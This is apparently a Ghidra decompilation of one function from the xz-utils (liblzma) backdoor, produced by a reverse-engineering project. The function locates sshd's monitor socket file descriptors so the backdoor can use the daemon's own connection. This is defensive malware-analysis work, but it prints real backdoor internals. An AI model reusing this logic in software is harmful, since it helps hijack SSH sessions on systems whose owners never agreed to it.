// /home/kali/xzre-ghidra/xzregh/107C60_sshd_get_client_socket.c
// Function: sshd_get_client_socket @ 0x107C60
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_client_socket(global_context_t * ctx, int * pSocket, int socket_index, SocketMode socket_direction)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Get either the read or write end of the sshd connection.
 *
 *   this is done by using the `struct monitor` address in @p ctx or, if not set,
 *   by getting the first usable socket having index @p socket_index
 *
 *   @param ctx the global context
 *   @param pSocket output variable that will receive the socket fd
 *   @param socket_index index `n` of the n-th usable socket that the function should return
 *   @param socket_direction whether to get the receiving or the sending socket
 *   @return BOOL TRUE if the socket was found, FALSE otherwise
 */

BOOL sshd_get_client_socket
               (global_context_t *ctx,int *pSocket,int socket_index,SocketMode socket_direction)

{
  monitor *addr;
  BOOL BVar1;
  ssize_t sVar2;
  int *piVar3;
  libc_imports_t *plVar4;
  int fd;
  undefined1 local_39 [9];
  
  if (((ctx == (global_context_t *)0x0) ||
      (plVar4 = ctx->libc_imports, plVar4 == (libc_imports_t *)0x0)) || (pSocket == (int *)0x0)) {
    return 0;
  }
  if (ctx->struct_monitor_ptr_address != (monitor **)0x0) {
    addr = *ctx->struct_monitor_ptr_address;
    BVar1 = is_range_mapped((u8 *)addr,4,ctx);
    if (BVar1 != 0) {
      if (socket_direction == DIR_WRITE) {
        fd = addr->m_recvfd;
      }
      else {
        if (socket_direction != DIR_READ) {
          return 0;
        }
        fd = addr->m_sendfd;
      }
      local_39[0] = 0;
      plVar4 = ctx->libc_imports;
      if (((-1 < fd) && (plVar4 != (libc_imports_t *)0x0)) &&
         ((plVar4->read != (_func_25 *)0x0 && (plVar4->__errno_location != (_func_26 *)0x0)))) {
        do {
          sVar2 = (*plVar4->read)(fd,local_39,0);
          piVar3 = (*plVar4->__errno_location)();
          if (-1 < (int)sVar2) goto LAB_00107d34;
        } while (*piVar3 == 4);
        if (*piVar3 != 9) {
LAB_00107d34:
          *pSocket = fd;
          return 1;
        }
      }
    }
    plVar4 = ctx->libc_imports;
  }
  BVar1 = sshd_get_usable_socket(pSocket,socket_index,plVar4);
  return BVar1;
}

